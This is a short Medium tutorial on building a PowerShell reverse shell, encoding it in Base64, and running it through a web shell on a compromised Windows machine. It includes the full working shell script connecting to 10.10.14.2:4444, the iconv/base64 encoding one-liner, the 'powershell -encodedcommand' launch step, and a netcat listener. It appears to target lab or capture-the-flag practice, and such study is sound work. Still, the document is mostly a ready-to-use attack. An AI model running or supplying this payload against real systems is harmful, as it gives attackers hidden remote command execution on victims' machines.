Source: https://medium.com/@tareshsharma17/turning-a-powershell-script-into-an-encoded-command-for-reverse-shells-0bd6b28565e4

# Step 1: Create Your Reverse Shell Script

Start by crafting the reverse shell script. Here’s an example of a simple PowerShell reverse shell:

```
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.2', 4444);## change your IP/Port accordingly
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = ([System.Text.Encoding]::ASCII).GetString($bytes, 0, $i);
    $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String);
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte, 0, $sendbyte.Length);
    $stream.Flush();
}
$client.Close();
```

Save this script as reverse.ps1 on your Kali machine.

# Step 2: Encode the Script in Base64

To execute the script as a Base64-encoded command, follow these steps:

Open a terminal on your Kali machine.
Encode the content of reverse.ps1 into Base64:
```
cat reverse.ps1 | iconv -t UTF-16LE | base64 -w 0
```

iconv -t UTF-16LE ensures compatibility with PowerShell’s expected encoding.
base64 -w 0 generates the Base64 string in a single line

# Step 3: Execute the Encoded Command in the PowerShell Web Shell

Now that you have the Base64-encoded command, you can run it in the PowerShell web shell on the compromised machine. Use the following syntax:

```
powershell -encodedcommand <Base64_String>
```

Replace <Base64_String> with the Base64-encoded output from Step 2.

# Step 4: Set Up a Listener on Kali

On your Kali machine, set up a listener to catch the reverse shell connection. Use netcat for this:
```
nc -lnvp 4444
```

When the encoded command runs successfully on the target, you should see a reverse shell connection from the compromised Windows machine.